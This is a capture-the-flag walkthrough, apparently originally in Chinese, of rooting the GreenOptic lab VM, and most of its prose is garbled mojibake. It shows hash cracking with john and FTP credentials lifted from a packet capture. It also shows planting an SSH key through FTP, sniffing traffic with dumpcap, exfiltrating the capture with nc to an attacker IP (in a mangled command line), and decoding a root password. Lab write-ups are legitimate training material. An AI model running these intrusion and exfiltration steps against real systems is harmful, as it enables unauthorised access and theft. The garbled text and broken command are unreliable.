Use the "--show" option to display all of the cracked passwords reliably
Session completed
â”Œâ”€â”€(rootğŸ’€kali)-[/usr/share/wordlists]
â””â”€# john --show /tmp/htpasswd                                
staff:wheeler
1 password hash cracked, 0 left
```
ä½¿ç”¨`staff/wheeler`ç™»å½•ã€‚
![]()
ä½¿ç”¨terryè¿›è¡Œç™»å½•ã€‚
![]()
æ‰¾åˆ°ä¸€åˆ™æ¶ˆæ¯ï¼Œä¸‹è½½`dpi`å‹ç¼©åŒ…ã€‚
![]()
ä½¿ç”¨samé‚®ä»¶çš„å¯†ç è¿›è¡Œè§£å‹ã€‚
![]()
ä½¿ç”¨wiresharkæ‰“å¼€æ•°æ®åŒ…ï¼Œå³é”®follow TCP streamï¼Œæ‰¾åˆ°ç¬¬25ä¸ªæ•°æ®åŒ…ï¼Œæ˜¯FTPç”¨æˆ·ç™»å½•ï¼Œ`alex/FwejAASD1`ã€‚ï¼ˆFTPæ˜¯æ˜æ–‡ä¼ è¾“ï¼‰
![]()
ä½¿ç”¨FTPè´¦å·è¿›è¡Œç™»å½•ã€‚
```
â”Œâ”€â”€(rootğŸ’€kali)-[~/Downloads]
â””â”€# ftp 192.168.32.139
Connected to 192.168.32.139.
220 (vsFTPd 3.0.2)
Name (192.168.32.139:root): alex
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> pwd
257 "/home/alex"
ftp> 
```
çŸ¥é“å½“å‰ç›®å½•æ˜¯`/home/alex`ï¼Œè¿™æ ·å¯ä»¥ä¸Šä¼ å…¬é’¥ï¼Œç”¨è¯ä¹¦ç™»å½•ã€‚
ç”Ÿæˆå…¬é’¥å’Œç§é’¥ã€‚
```
â”Œâ”€â”€(rootğŸ’€kali)-[/tmp]
â””â”€# ssh-keygen          
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): /tmp/id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /tmp/id_rsa
Your public key has been saved in /tmp/id_rsa.pub
The key fingerprint is:
SHA256:Q0ht+VhJfqKtOcYclyVknabBEPTte9FKbk3QeRXxHlk root@kali
The key's randomart image is:
+---[RSA 3072]----+
|      .o+*+o . oE|
|     . .+==.+  .*|
|      ...+=++ .++|
|       ..ooB   +o|
|        S + . o +|
|       o *   + = |
|        B   . = .|
|       . .   o   |
|                 |
+----[SHA256]-----+
```
ä¸Šä¼ å…¬é’¥åˆ°FTPæœåŠ¡å™¨
```
ftp> 
ftp> mkdir .ssh
257 "/home/alex/.ssh" created
ftp> cd .ssh
250 Directory successfully changed.
ftp> put /tmp/id_rsa.pub
local: /tmp/id_rsa.pub remote: /tmp/id_rsa.pub
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
563 bytes sent in 0.00 secs (9.1003 MB/s)
```
ä½¿ç”¨è¯ä¹¦è¿›è¡Œç™»å½•
```
â”Œâ”€â”€(rootğŸ’€kali)-[/tmp]
â””â”€# ssh -i id_rsa PI:EMAIL 
[alex@websrv01 ~]$ whoami
alex
[alex@websrv01 ~]$ id
uid=1002(alex) gid=1002(alex) groups=1002(alex),994(wireshark)
```
è¯·æ³¨æ„ï¼Œ`id`è¿™`alex`æ˜¯wiresharkç»„çš„ä¸€éƒ¨åˆ†ï¼Ÿè®©æˆ‘ä»¬çœ‹çœ‹é‚£ä¸ªç»„å¯ä»¥åœ¨è¿™ä¸ªç›’å­ä¸Šè¿è¡Œä»€ä¹ˆã€‚
```
[alex@websrv01 opt]$ find / -type f -group wireshark 2>/dev/null
/usr/sbin/dumpcap
```
dumpcapå‘½ä»¤æ˜¯wiresharkå‘½ä»¤è¡Œæ•æ‰æ•°æ®åŒ…ï¼ŒçŒœæµ‹é¶æœºè‡ªåŠ¨ä¼ è¾“ä¸€äº›æ•æ„Ÿä¿¡æ¯ï¼ŒæŠ“å–æ‰€æœ‰ç½‘å¡æ¥å£çš„æµé‡ã€‚
```
[alex@websrv01 tmp]$ dumpcap -i any
Capturing on 'any'
File: /tmp/wireshark_pcapng_any_20211227090725_V7WCH2
Packets captured: 394
Packets received/dropped on interface 'any': 394/0 (pcap:0/dumpcap:0/flushed:0) (100.0%)
```
æœ¬åœ°éƒ¨ç½²httpæœåŠ¡å™¨ï¼Œè®©é¶åœºä¸‹è½½ncå‘½ä»¤ã€‚
![]()
ä½¿ç”¨ncå‘½ä»¤ä¼ è¾“æ•°æ®ã€‚
```
#é¶æœº
[alex@websrv01 tmp]$ chmod +x nc
[alex@websrv01 tmp]$ ./nc -w 3 192.168.32.130 8000  wireshark.pcap
listening on [any] 8000 ...
connect to [192.168.32.130] from (UNKNOWN) [192.168.32.139] 42498
```
å…ˆæ’é™¤SSHåè®®æ•°æ®åŒ…
```
!(ip.addr==192.168.32.130)
```
æ‰¾åˆ°ä¸€ä¸ªSMTPçš„æ•°æ®åŒ…ï¼Œé‡Œé¢æœ‰ä¸€æ®µbase64åŠ å¯†çš„å­—ç¬¦ä¸²
![]()
è§£å¯†å­—ç¬¦ä¸²ï¼Œå¾—åˆ°rootå¯†ç 
```
â”Œâ”€â”€(rootğŸ’€kali)-[~/Downloads]
â””â”€# echo AHJvb3QAQVNmb2pvajJlb3p4Y3p6bWVkbG1lZEFTQVNES29qM28= | base64 -d
rootASfojoj2eozxczzmedlmedASASDKoj3o                                                                                                                     
```
æœ€åè·å–rootç”¨æˆ·æˆåŠŸã€‚
```
[alex@websrv01 tmp]$ su -
Password: 
Last failed login: Mon Dec 27 09:29:09 GMT 2021 on pts/0
There were 2 failed login attempts since the last successful login.
[root@websrv01 ~]# 
[root@websrv01 ~]# ls
anaconda-ks.cfg  root.txt
[root@websrv01 ~]# cat root.txt 
Congratulations on getting root!
  ____                      ___        _   _      
 / ___|_ __ ___  ___ _ __  / _ \ _ __ | |_(_) ___ 
| |  _| '__/ _ \/ _ \ '_ \| | | | '_ \| __| |/ __|
| |_| | | |  __/  __/ | | | |_| | |_) | |_| | (__ 
 \____|_|  \___|\___|_| |_|\___/| .__/ \__|_|\___|
                                |_|             
You've overcome a series of difficult challenges, so well done!
I'm happy to make my CTFs available for free. If you enjoyed doing the CTF, please leave a comment on my blog at https://security.caerdydd.wales - I will be happy for your feedback so I can improve them and make them more enjoyable in the future.
*********
Kindly place your vote on the poll located here to let me know how difficult you found it: https://security.caerdydd.wales/greenoptic-ctf/
*********
Thanks,
bootlesshacker
```